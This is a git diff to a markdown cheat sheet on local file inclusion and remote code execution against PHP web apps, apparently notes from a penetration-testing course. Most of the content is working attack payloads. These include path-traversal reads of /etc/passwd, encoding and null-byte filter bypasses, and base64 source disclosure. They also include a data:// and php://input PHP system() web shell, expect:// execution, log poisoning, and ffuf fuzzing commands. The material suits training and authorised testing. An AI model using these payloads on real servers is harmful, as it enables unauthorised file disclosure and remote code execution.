@@ -1,6 +1,12 @@
 # File Inclusion
 
 ## Local File Inclusion
+
+- Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\Windows\boot.ini on Windows.
+- If we find files on the web server (.php files for example), that return other status codes than 200 when fuzzing, these can still be viewed with LFI, so should not be ignored.
+- If files get rendered during LFI we can encode them first, then decode to read the source code.
+- If the web serrver adds a file extension like .php we do not need to add it when trying to LFI index.php, for example, to read the source code.
+
 | Command | Description |
 |---------|-------------|
 | **Basic LFI** | |
@@ -11,14 +17,19 @@
 | **LFI Bypasses** | |
 | `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |
 | `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
-| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
+| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done` |
 | `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |
 | `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |
 
+### Second order attacks
+
+Setting user names to `../../../../etc/passwd`, for example, could result in the LFI elsewhere the username is used.
+
 ## Remote Code Execution
+
 | Command | Description |
 |---------|-------------|
-| **PHP Wrappers** | |
+| **[PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php)** | |
 | `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with data wrapper |
 | `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
 | `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |
@@ -40,14 +51,23 @@
 | `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned PHP session |
 
 ## Misc
+
+**[PHP filters](https://www.php.net/manual/en/filters.php)**
+- [String Filters](https://www.php.net/manual/en/filters.string.php)
+- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
+- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
+- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
+
 | Command | Description |
 |---------|-------------|
+| `ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php` | Fuzz for PHP files |
 | `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
 | `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
 | `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
 | `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
 
 ## LFI Wordlists
+
 - LFI-Jhaddix.txt
 - Webroot path wordlist for Linux
 - Webroot path wordlist for Windows
@@ -55,6 +75,7 @@
 - Server configurations wordlist for Windows
 
 ## File Inclusion Functions
+
 | Function | Read Content | Execute | Remote URL |
 |----------|--------------|---------|------------|
 | **PHP** | | | |
